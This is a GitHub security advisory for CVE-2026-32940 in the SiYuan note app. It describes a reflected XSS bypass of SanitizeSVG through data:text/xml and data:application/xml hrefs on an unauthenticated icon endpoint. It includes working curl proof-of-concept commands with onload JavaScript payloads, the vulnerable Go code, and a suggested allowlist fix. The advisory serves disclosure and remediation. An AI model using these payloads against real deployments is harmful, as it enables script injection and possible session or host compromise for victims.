# [C] SiYuan has a SanitizeSVG bypass via data:text/xml in getDynamicIcon (incomplete fix for CVE-2026-29183)

## Summary
Severity: Critical
Advisory: GHSA-4mx9-3c2h-hwhg
CVE: CVE-2026-32940
CWE: CWE-184, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-4mx9-3c2h-hwhg
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan` — affected >=0

## Details
# SanitizeSVG bypass via data:text/xml in getDynamicIcon (incomplete fix for CVE-2026-29183)

`SanitizeSVG` blocks `data:text/html` and `data:image/svg+xml` in href attributes but misses `data:text/xml` and `data:application/xml`. Both render SVG with `onload` JavaScript execution (confirmed in Chromium 136, other browsers untested).

`/api/icon/getDynamicIcon` is unauthenticated and serves SVG as `Content-Type: image/svg+xml`. The `content` parameter (type=8) gets embedded into the SVG via `fmt.Sprintf` with no escaping. The sanitizer catches `data:text/html` but `data:text/xml` passes the blocklist -- only three MIME types are checked.

This is a click-through XSS: victim visits the crafted URL, sees an SVG with an injected link, clicks it. If SiYuan renders these icons via `<img>` tags in the frontend, links aren't interactive there -- the attack needs direct navigation to the endpoint URL or `<object>`/`<embed>` embedding.

## Steps to reproduce

Against SiYuan v3.6.0 (Docker):

```sh
# 1. data:text/xml bypass -- <a> element preserved with href intact
curl -s --get "http://127.0.0.1:6806/api/icon/getDynamicIcon" \
  --data-urlencode 'type=8' \
  --data-urlencode 'content=</text><a href="data:text/xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 onload=%27alert(document.domain)%27/%3E">click</a><text>' \
  | grep -o '<a [^>]*>'
# Output: <a href="data:text/xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 onload=%27alert(document.domain)%27/%3E">

# 2. data:text/html is correctly blocked -- href stripped
curl -s --get "http://127.0.0.1:6806/api/icon/getDynamicIcon" \
  --data-urlencode 'type=8' \
  --data-urlencode 'content=</text><a href="data:text/html,<script>alert(1)</script>">click</a><text>' \
  | grep -o '<a [^>]*>'
# Output: <a>  (href removed)

# 3. data:application/xml also bypasses
curl -s --get "http://127.0.0.1:6806/api/icon/getDynamicIcon" \
  --data-urlencode 'type=8' \
  --data-urlencode 'content=</text><a href="data:application/xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 onload=%27alert(1)%27/%3E">click</a><text>' \
  | grep -o '<a [^>]*>'
# Output: <a href="data:application/xml,...">  (href preserved)
```

JS execution confirmed in Chromium 136 -- `data:text/xml` SVG `onload` fires and posts a message to the parent window via iframe test.

## Vulnerable code

`kernel/util/misc.go` lines 289-293:

```go
if strings.HasPrefix(val, "data:") {
    if strings.Contains(val, "text/html") || strings.Contains(val, "image/svg+xml") || strings.Contains(val, "application/xhtml+xml") {
        continue
    }
}
```

`text/xml` and `application/xml` aren't in the list. Both serve SVG with JS execution.

## Impact

Reflected XSS on an unauthenticated endpoint. Victim visits the crafted URL, then clicks the injected link in the SVG. No auth needed to craft the URL.

Docker deployments where SiYuan is network-accessible are the clearest target -- the endpoint is reachable directly. In the Electron desktop app, impact depends on `nodeIntegration`/`contextIsolation` settings. Issue #15970 ("XSS to RCE") explored that path.

The deeper issue: the blocklist approach for data: URIs is fragile. `text/xml` and `application/xml` are the gap today, but other MIME types that render active content could surface. An allowlist of safe image types covers the known vectors and future MIME type additions.

## Affected versions

v3.6.0 (latest, confirmed). All versions since `SanitizeSVG` was added to fix CVE-2026-29183.

## Suggested fix

Flip the data: URI check to an allowlist -- only permit safe image types in href:

```go
if strings.HasPrefix(val, "data:") {
    safe := strings.HasPrefix(val, "data:image/png") ||
            strings.HasPrefix(val, "data:image/jpeg") ||
            strings.HasPrefix(val, "data:image/gif") ||
            strings.HasPrefix(val, "data:image/webp")
    if !safe {
        continue
    }
}
```

If you prefer extending the blocklist, add at minimum: `text/xml`, `application/xml`, `text/xsl`, and `multipart/` types.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4mx9-3c2h-hwhg
- https://nvd.nist.gov/vuln/detail/CVE-2026-32940
- https://github.com/siyuan-note/siyuan/commit/d01d561875d4f744e9f6232f1d4831e3642b8696
- https://github.com/advisories/GHSA-6865-qjcf-286f
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
